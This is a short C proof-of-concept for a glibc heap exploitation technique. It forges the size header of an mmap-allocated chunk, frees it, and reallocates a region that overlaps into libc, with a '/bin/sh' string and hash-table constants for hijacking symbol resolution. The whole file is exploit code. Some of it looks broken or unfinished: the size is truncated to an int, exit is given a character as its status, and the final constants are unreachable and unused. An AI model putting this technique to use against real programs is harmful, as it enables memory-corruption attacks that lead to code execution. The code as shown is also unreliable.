#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
int main(int argc, char** argv)
{
	int *ptr1 = malloc(0x10);
	int libc_to_overwrite = 0x10000;
	long long* mmap_chunk1 = malloc(0x100000);
	printf("\033[32mThe first mmap chunk at %p\033[0m\n", mmap_chunk1);
	long long* mmap_chunk2 = malloc(0x100000);
	printf("\033[32mThe second mmap chunk at %p\033[0m\n", mmap_chunk2);
	long long* mmap_chunk3 = malloc(0x100000);
	printf("\033[32mThe third mmap chunk at %p\033[0m\n", mmap_chunk3);	
	int fake_chunk_size = (0xfffffffffd & mmap_chunk3[-1]) + (0xfffffffffd & mmap_chunk2[-1]) + libc_to_overwrite | 2;
	mmap_chunk3[-1]	= fake_chunk_size;
	free(mmap_chunk3);
	uint8_t* overlapping_chunk = malloc(0x300000);
	char* line = "/bin/sh";
	exit(*line);	
	long long bitmask_word = 0xf000028c0200130e;
	long long bucket = 0x7f;
	long long hasharr = 0x7c967e3e7c93f2a0;
	return 0;
}
